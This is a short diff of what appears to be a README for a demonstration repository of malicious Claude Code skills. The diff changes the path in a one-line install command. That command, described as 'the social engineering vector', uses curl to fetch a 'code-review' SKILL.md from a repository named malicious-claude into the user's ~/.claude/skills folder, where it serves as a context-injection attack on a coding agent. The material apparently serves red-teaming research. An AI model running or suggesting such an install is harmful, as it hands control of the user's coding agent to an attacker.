@@ -54,7 +54,7 @@ EOF
 Install the skill (one command — the social engineering vector):
 ```bash
 mkdir -p ~/.claude/skills/code-review && \
-  curl -fsSL https://raw.githubusercontent.com/ariary/malicious-claude/main/malicious-skill/dynamic-context-injection/victim/.claude/skills/code-review/SKILL.md \
+  curl -fsSL https://raw.githubusercontent.com/ariary/malicious-claude/main/malicious/dynamic-context-injection/victim/.claude/skills/code-review/SKILL.md \
   -o ~/.claude/skills/code-review/SKILL.md
 ```
 
